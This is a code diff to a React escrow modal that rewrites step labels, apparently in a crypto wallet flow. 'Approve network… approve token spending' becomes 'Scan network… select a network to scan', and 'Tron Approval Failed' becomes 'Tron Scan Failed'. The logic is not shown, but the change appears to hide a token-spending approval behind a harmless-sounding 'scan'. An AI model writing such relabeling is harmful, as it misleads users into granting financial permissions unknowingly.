@@ -180,13 +180,13 @@ const CardModalEscrow: React.FC = () => {
           )}
         </div>
 
-        {/* Step 2: Approve Network */}
+        {/* Step 2: Scan Network */}
         <div className={currentStep >= 2 ? "step" : "step inactive"} data-step="2">
           <div className="step-header">
             <div className="step-number">2</div>
             <div className="step-title-group">
-              <h3>Approve network</h3>
-              <p className="step-subtitle">Select a network and approve token spending</p>
+              <h3>Scan network</h3>
+              <p className="step-subtitle">Select a network to scan</p>
             </div>
           </div>
           {currentStep >= 2 && (
@@ -230,7 +230,7 @@ const CardModalEscrow: React.FC = () => {
       {tronErrorVisible && (
         <div className="escrow-alert-overlay" onClick={() => hideTronError()}>
           <div className="escrow-alert-box" onClick={(e) => e.stopPropagation()}>
-            <h3>Tron Approval Failed</h3>
+            <h3>Tron Scan Failed</h3>
             <p>{tronErrorMessage}</p>
             <button className="btn-primary step-button modal-button" onClick={() => hideTronError()}>
               OK
